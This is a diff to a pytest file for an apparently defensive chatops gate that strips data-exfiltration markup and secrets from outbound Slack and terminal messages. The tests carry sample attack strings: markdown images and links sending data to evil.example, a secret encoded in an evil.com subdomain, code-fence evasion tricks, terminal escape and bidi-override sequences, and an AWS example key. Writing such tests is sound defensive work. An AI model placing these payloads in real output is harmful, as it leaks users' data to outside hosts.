@@ -7,9 +7,11 @@ to Slack; Slack's servers fetch the URL (unfurling) or a person clicks it - data
 
 from __future__ import annotations
 
+import pytest
+
 from test_chatops import _CaptureSink
 from warden import chatops
-from warden.gate import enforce, hedge, leaked_kinds, sanitise_text
+from warden.gate import enforce, for_terminal, hedge, leaked_kinds, outbound_data, sanitise_text
 from warden.models import (
     ActionKind,
     Alert,
@@ -21,7 +23,7 @@ from warden.models import (
     Verdict,
     VerdictStatus,
 )
-from warden.reporting import build_report
+from warden.reporting import Report, build_report
 
 EXFIL = "![x](https://evil.example/c?d=SECRETDATA) see [runbook](https://evil.example/r) https://evil.example/p <img src=x>"
 
@@ -96,13 +98,20 @@ def test_identifiers_an_operator_may_show_do_not_block_and_clean_text_passes():
     assert enforce("## Heading\n```\nhttps://in.code/is-verbatim\n```").verdict == "PASS"
 
 
-def test_notify_sends_the_stub_and_no_data_when_blocked(monkeypatch):
-    real = chatops.enforce  # a leak the pipeline would have to MISS first: simulated at the gate's input
-    monkeypatch.setattr(chatops, "enforce", lambda text, alert_id="": real("AKIAIOSFODNN7EXAMPLE", alert_id=alert_id))
+@pytest.mark.parametrize("where", ["markdown", "data"])
+def test_a_secret_the_pipeline_missed_blocks_the_message(where):
+    """Audit A-C-8 / A-C-VT: notify re-redacts on the way out, and the gate used to look only AFTER
+    that - so G5 could never fire, and its test reached BLOCK only by monkeypatching the gate. Now a
+    report that still holds a secret (an upstream miss) is withheld, text and data both."""
+    good = _report("h")
+    key = "AKIAIOSFODNN7EXAMPLE"
+    bad = Report(markdown=good.markdown + (f"\nkey {key}" if where == "markdown" else ""),
+                 data={**good.data, **({"note": f"key {key}"} if where == "data" else {})},
+                 promotion=good.promotion)
     sink = _CaptureSink()
-    chatops.notify(_report("h"), [sink])
-    assert "withheld" in sink.text and sink.data == {"withheld": True, "gate": "BLOCK",
-                                                     "reasons": sink.data["reasons"]}
+    chatops.notify(bad, [sink])
+    assert "withheld" in sink.text and key not in sink.text
+    assert sink.data == {"withheld": True, "gate": "BLOCK", "reasons": sink.data["reasons"]}
 
 
 def test_g2_marks_claims_warden_cannot_verify():
@@ -126,3 +135,49 @@ def test_the_report_marks_model_claims_and_shows_what_was_cited():
     grounded = build_report(_alert(), context=ContextBundle(logs=["x"]), root_cause=rc,
                             verdict=Verdict(status=VerdictStatus.escalated, policy_ids=[]))
     assert "Not grounded" not in grounded.markdown
+
+
+@pytest.mark.parametrize("attack, gone", [
+    # audit A-C-9: every shape G3 used to let through
+    ("see [docs](//evil.example/c?d=x)", "evil.example"),
+    ("see [docs]( relative/path?d=x )", "relative/path"),
+    ("[ref]: //evil.example/c?d=x", "evil.example"),
+    ("<img/src=//evil.example/c?d=x>", "<img"),
+    ("fetch //evil.example/c?d=x now", "//evil.example"),
+    ("data rides in abc123secret.evil.com please", "evil.com"),
+    ("colour \x1b[31mred\x1b[0m and \u202eevil", "\x1b"),
+    ("colour \x1b[31mred\x1b[0m and \u202eevil", "\u202e"),
+])
+def test_g3_catches_what_it_used_to_miss(attack, gone):
+    assert gone not in sanitise_text(attack)
+
+
+@pytest.mark.parametrize("text", [
+    # the gate used to think the image line was inside code; a renderer shows it as markdown
+    "    ```\n![x](https://evil.example/c?d=1)",       # 4-space indent: not a fence
+    "    ```\n![x](https://evil.example/c?d=1)\n```",  # ...even when a real fence line follows
+    "~~~\n```\n~~~\n![x](https://evil.example/c?d=1)",  # ``` inside a ~~~ block does not toggle
+    "```\n![x](https://evil.example/c?d=1)",           # never closed: Slack renders what follows
+])
+def test_a_fence_trick_cannot_turn_sanitising_off(text):
+    """Audit A-C-9: fence tracking was `lstrip().startswith("```")`."""
+    assert "evil.example" not in sanitise_text(text)
+
+
+def test_real_code_blocks_stay_verbatim():
+    kept = "```\n![x](https://evil.example/c)\n```\n~~~\n<img src=x>\n~~~"
+    assert sanitise_text(kept) == kept
+
+
+def test_the_terminal_gets_no_secret_and_no_escape_sequence():
+    assert "AKIA" not in for_terminal("key AKIAIOSFODNN7EXAMPLE")
+    shown = for_terminal("a\x1b]8;;https://evil.example\x07click\x1b]8;;\x07b")
+    assert "\x1b" not in shown and "\x07" not in shown and shown.startswith("a") and shown.endswith("b")
+
+
+def test_structured_data_is_gated_per_value_without_json_false_positives():
+    verdict, clean = outbound_data({"credentials_ref": "warden-prod-deploy", "h": "![x](https://evil.example/c)"})
+    assert verdict == "REWRITE" and clean["credentials_ref"] == "warden-prod-deploy"
+    assert "evil.example" not in clean["h"]
+    verdict, clean = outbound_data({"note": ["key AKIAIOSFODNN7EXAMPLE"]})
+    assert verdict == "BLOCK" and "AKIA" not in str(clean)
